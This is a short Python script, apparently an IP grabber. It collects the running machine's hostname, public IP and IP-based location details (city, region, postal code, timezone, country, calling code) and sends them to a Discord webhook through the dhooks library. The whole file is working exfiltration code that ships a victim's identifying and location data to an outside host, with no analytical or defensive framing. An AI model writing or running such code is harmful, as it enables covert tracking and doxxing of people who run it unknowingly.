
from dhooks import Webhook
import socket
from requests import get
import requests




hook = Webhook("Webhook")


pcname = socket.gethostname()
ip = get('https://api.ipify.org'). text
requests = requests.get(f"http://ip-api.com/xml/{ip}"). text
city = get(f'https://ipapi.co/{ip}/city').text
region = get(f'https://ipapi.co/{ip}/region').text
postal = get(f'https://ipapi.co/{ip}/postal').text
timezone = get(f'https://ipapi.co/{ip}/timezone').text
currency = get(f'https://ipapi.co/{ip}/currency').text
country = get(f'https://ipapi.co/{ip}/country_name').text
callcode = get(f"https://ipapi.co/{ip}/country_calling_code").text




hook.send(f"pc name : {pcname}\n public ip : {ip} \n ``` city : {city} \n region : {region} \n postal : {postal} \n timezone  {timezone} \n currency : {currency} \n country : {country} \n callcode : {callcode} ```")


